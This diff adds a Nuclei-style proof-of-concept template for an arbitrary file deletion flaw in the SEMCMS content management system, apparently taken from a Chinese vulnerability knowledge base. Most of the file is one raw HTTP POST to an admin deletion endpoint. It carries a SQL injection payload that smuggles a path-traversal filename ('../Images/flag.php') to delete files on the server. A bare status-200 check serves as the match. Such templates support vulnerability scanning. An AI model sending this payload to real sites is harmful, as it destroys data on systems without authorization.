@@ -1,0 +1,57 @@
+id: poc-wug6536hwkkv5kei
+info:
+  name: SEMCMS 任意文件删除漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wug6536hwkkv5kei'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wug6536hwkkv5kei
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /semcms_php_4.8/916lGe_Admin/SEMCMS_Link.php?Class=Deleted&CF=link&page= HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Connection: close
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+
+
+    languageID=1&AID%5B%5D=2)union select 1,2,3,4,5,6,''../Images/flag.php''  #
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
